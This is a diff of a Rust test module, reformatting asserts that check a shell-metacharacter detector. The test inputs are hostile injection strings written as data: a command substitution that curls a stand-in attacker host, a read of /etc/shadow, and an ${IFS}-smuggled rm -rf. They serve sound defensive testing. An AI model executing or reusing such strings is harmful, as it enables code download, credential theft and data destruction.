@@ -1267,8 +1267,7 @@ mod tests {
         // $() inside double quotes — the audit's primary example.
         assert!(contains_shell_metacharacters(r#"echo "$(id)""#).is_some());
         assert!(
-            contains_shell_metacharacters(r#"echo "$(curl https://attacker.example/x)""#)
-                .is_some()
+            contains_shell_metacharacters(r#"echo "$(curl https://attacker.example/x)""#).is_some()
         );
         assert!(contains_shell_metacharacters(r#"cat "$(cat /etc/shadow)""#).is_some());
         // Backtick form inside double quotes.
@@ -1278,10 +1277,7 @@ mod tests {
         // `${IFS}` trick lets the attacker smuggle whitespace past
         // outer-binary allowlists ("echo ${IFS}rm -rf /").
         assert!(contains_shell_metacharacters(r#"echo "${IFS}id""#).is_some());
-        assert!(
-            contains_shell_metacharacters(r#"echo "${IFS}rm -rf /tmp/foo${IFS}""#)
-                .is_some()
-        );
+        assert!(contains_shell_metacharacters(r#"echo "${IFS}rm -rf /tmp/foo${IFS}""#).is_some());
     }
 
     #[test]
